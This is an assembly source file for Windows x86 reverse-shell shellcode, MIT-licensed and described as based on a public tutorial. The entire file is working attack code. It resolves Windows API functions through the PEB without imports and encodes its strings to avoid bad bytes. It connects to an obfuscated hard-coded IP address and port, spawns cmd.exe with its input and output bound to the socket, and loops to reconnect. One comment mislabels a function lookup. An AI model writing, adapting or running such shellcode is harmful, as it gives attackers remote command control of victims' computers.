; Windows x86 32 bits shellcode reverse shelll
; not contains: 0x00, 0x0A, 0x0D

; MIT License - Copyright 2020
; David Reguera Garcia aka Dreg - dreg@fr33project.org
; -
; http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
; FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
; IN THE SOFTWARE.

; Based from: 
; https://h0mbre.github.io/Win32_Reverse_Shellcode/#
;
; WARNING: The crappiest shellcode asm in the world


[BITS 32]

%macro push_0 0
	push 0x69
	xor byte [esp], 0x69
%endmacro 

%macro  FindKernel32Base 0
	mov edi, [fs:ebx+0x30]
	mov edi, [edi+0x0c]
	mov edi, [edi+0x1c]

	%%module_loop:
	mov eax, [edi+0x08]
	mov esi, [edi+0x20]
	mov edi, [edi]
	cmp byte [esi+12], '3'
	jne %%module_loop
%endmacro 

global WinMain

section .text
WinMain:

loopez:
pushfd
pushad

xor ebx, ebx

FindKernel32Base

mov edi, eax
add edi, [eax+0x3c]

mov edx, [edi+0x78]
add edx, eax

mov edi, [edx+0x20]
add edi, eax

mov ebp, ebx
name_loop:
mov esi, [edi+ebp*4]
add esi, eax
inc ebp
cmp dword [esi], 0x50746547 ; GetP
jne name_loop
cmp dword [esi+8], 0x65726464 ; ddre
jne name_loop

mov edi, [edx+0x24]
add edi, eax
mov bp, [edi+ebp*2]

mov edi, [edx+0x1C]
add edi, eax
mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
add edi, eax

; edi GetProcAddress address
; eax kernel32.dll base address


; push LoadLibraryA,0
push_0 
push 0x41797261
push 0x7262694C
push 0x64616F4C
push esp

push eax
xchg eax, esi
call edi

; esi kernel32.dll base address
; edi GetProcAddress address
; eax LoadLibraryA address
add  esp, 4*4

push esi
push edi
push eax


; push  ExitProcess, 0
push 0x69737365
xor byte [esp+3], 0x69
push 0x636F7250
push 0x74697845
push esp

push esi
call edi

add  esp, 4*3
push eax



; [esp] ExitProcess
; [esp+0x4] LoadLibraryA
; [esp+0x8] GetProcAddress
; [esp+0x0C] kernel32 base address 
; popad
; popfd

; push ws2_32.dll, 0
mov eax, [esp+0x4]
push 0x69696c6c
xor word [esp + 0x2], 0x6969
push 0x642e3233
push 0x5f327377
push esp
call eax

add  esp, 4*3
push eax

; [esp] ws2_32.dll base address 
; [esp+0x04] ExitProcess
; [esp+0x08] LoadLibraryA
; [esp+0x0C] GetProcAddress
; [esp+0x10] kernel32 base address 
; popad
; popfd

mov edi, [esp+0x0C]
; push WSAStartup, 0
push 0x69697075
xor word [esp + 0x2], 0x6969
push 0x74726174
push 0x53415357
push esp
push eax
call edi

add  esp, 4*3

xor edx, edx
mov dx, 0x0190
sub esp, edx
push esp
push edx
call eax

xor edx, edx
mov dx, 0x0190
add esp, edx

mov eax, [esp]
mov edi, [esp+0x0C]
; push WSASocketA, 0
push 0x69694174
xor word [esp + 0x2], 0x6969
push 0x656b636f
push 0x53415357
push esp
push eax
call edi

add esp, 4*3

xor ebx, ebx
push ebx                              
push ebx
push ebx
xor edx, edx
mov dl, 0x6
push edx
inc ebx
push ebx
inc ebx
push ebx
call eax

mov esi, eax


mov eax, [esp]
mov edi, [esp+0x0C]
; push connect, 0
push 0x69746365
xor dword [esp + 0x3], 0x69
push 0x6e6e6f63
push esp
push eax
call edi

add esp, 4*2

xor ecx, ecx
push dword 0x77D23CCC ; IP 
xor dword [esp], 0xffffffff
push word 0xA3EE ; PORT
not word [esp]
xor ebx, ebx
add bl, 0x2
push word bx
mov edx, esp
push byte 16
push edx
push esi
xchg eax, edi
call edi

add esp, 4*2

mov eax, [esp+0x10]
mov edi, [esp+0x0C]
; push connect, 0
push 0x69694173 
xor word [esp + 0x2], 0x6969
push 0x7365636f
push 0x72506574
push 0x61657243
push esp
push eax
call edi

add esp, 4*4

; push cmd, 0
push 0x69646d63                      
xor dword [esp + 0x3], 0x69      
mov edx, esp  

push esi
push esi
push esi                   
xor ebx, ebx
xor ecx, ecx
add cl, 0x12                
                            

looper: 
push ebx
loop looper

mov word [esp + 0x3c], 0x0101      
mov byte [esp + 0x10], 0x44         
lea ecx, [esp + 0x10]  

push esp                             
push ecx                             
push ebx                            
push ebx
push ebx
inc ebx                              
push ebx
dec ebx
push ebx
push ebx
push edx                            
push ebx
call eax


add esp, 0x58


; call [esp+4] ; exit...


restore_all:
add esp, 0x14

popad
popfd

jmp loopez

db 0xCC





